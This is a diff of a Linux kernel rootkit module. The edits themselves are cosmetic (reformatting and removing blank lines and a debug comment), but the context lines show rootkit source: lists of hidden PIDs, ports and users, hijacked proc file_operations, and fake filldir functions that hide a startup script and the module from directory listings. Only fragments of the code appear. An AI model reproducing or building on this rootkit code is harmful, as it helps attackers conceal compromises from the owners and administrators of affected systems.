@@ -132,8 +132,15 @@ struct utmp {
 struct inode *pinode, *tinode, *uinode, *rcinode, *modinode, *sinode;
 struct proc_dir_entry *modules, *root, *handler, *tcp;
 static struct file_operations modules_fops, proc_fops, handler_fops, tcp_fops, user_fops, rc_fops, mod_fops, stat_fops;
-const struct file_operations *proc_original = 0, *modules_proc_original = 0, *stat_proc_original = 0, *handler_original = 0, *tcp_proc_original = 0, *user_proc_original = 0, *rc_proc_original = 0, *mod_proc_original;
 filldir_t proc_filldir, rc_filldir, mod_filldir;
+const struct file_operations *proc_original = 0,
+                             *modules_proc_original = 0,
+                             *stat_proc_original = 0,
+                             *handler_original = 0,
+                             *tcp_proc_original = 0,
+                             *user_proc_original = 0,
+                             *rc_proc_original = 0,
+                             *mod_proc_original;
 
 char *rc_name, *rc_dir, *mod_name, *mod_dir;
 module_param(rc_name , charp, 0);
@@ -151,8 +158,6 @@ char hidden_pids[MAX_HIDDEN_PIDS][MAX_PID_LENGTH];
 char hidden_dports[MAX_HIDDEN_PORTS][MAX_PORT_LENGTH], hidden_sports[MAX_HIDDEN_PORTS][MAX_PORT_LENGTH];
 char hidden_users[MAX_HIDDEN_USERS][UT_NAMESIZE];
 unsigned hidden_pid_count = 0, hidden_dport_count = 0, hidden_sport_count = 0, hidden_user_count = 0;
-
-
 
 
 int port_in_array(char arr[MAX_HIDDEN_PORTS][MAX_PORT_LENGTH], unsigned sz, char *val) {
@@ -323,7 +328,6 @@ static ssize_t do_read_users(struct file *fp, char __user *buf, size_t sz, loff_
 
 static ssize_t do_read_stat(struct file *fp, char __user *buf, size_t sz, loff_t *loff) {
     ssize_t read = stat_proc_original->read(fp, buf, sz, loff);
-    //printk("\n----buff(before)----%s\n", buf);
 
     int first_cpu = 1, cpu;
     char *lstart, *new_line;
@@ -559,7 +563,6 @@ int fake_proc_fill_dir(void *a, const char *buffer, int c, loff_t d, u64 e, unsi
     return proc_filldir(a, buffer, c, d, e, f);
 }
 
-
 int fake_rc_fill_dir(void *a, const char *buffer, int c, loff_t d, u64 e, unsigned f) {
     if(!strcmp(buffer, rc_name))
         return 0;
@@ -715,8 +718,5 @@ static void module_exit_proc(void) {
 
 module_init(module_init_proc);
 module_exit(module_exit_proc);
- 
+
 MODULE_LICENSE("GPL");
-
-
-
